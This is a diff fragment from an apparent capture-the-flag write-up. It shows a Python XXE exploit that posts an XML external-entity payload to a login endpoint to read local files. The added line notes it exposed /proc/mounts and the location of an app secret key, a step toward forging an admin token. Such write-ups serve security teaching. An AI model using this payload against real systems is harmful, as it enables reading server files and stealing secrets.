@@ -22,6 +22,7 @@ headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
 safe_string = urllib.parse.quote_plus(f'<?xml version="1.0" ?><!DOCTYPE r [<!ENTITY sp SYSTEM "file://{filename}">]><form><username>&sp;</username><password>p</password></form>')
 r = s.post(f"{url}/login/", data='xml='+safe_string, headers=headers)
 ```
+The description would point towards secrets and the XXE vulnerability allowed access to locations such as `/proc/mounts` revealing the mount points in use, and the location of the `app_secret_key`.
 
 The goal of this first phase is to access the docker secrets. So we can create a token as admin and access the '/private' link. This page contains the following information:
 
